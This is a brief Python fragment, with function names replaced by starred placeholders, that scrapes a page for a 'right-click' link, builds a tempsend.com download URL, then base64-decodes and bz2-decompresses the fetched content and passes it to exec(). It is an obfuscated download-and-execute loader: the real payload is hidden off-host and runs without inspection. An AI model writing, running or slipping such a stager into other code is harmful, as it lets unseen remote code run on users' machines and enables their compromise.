for line in ***URLO***("***URL***").read().split('\n'):
	if 'right-click' in line:
		url = 'http://tempsend.com' + line.split('"')[1]
		break
exec(***BZ2***(***B64D***(***URLO***(url).read()[***OFFSET***:])))
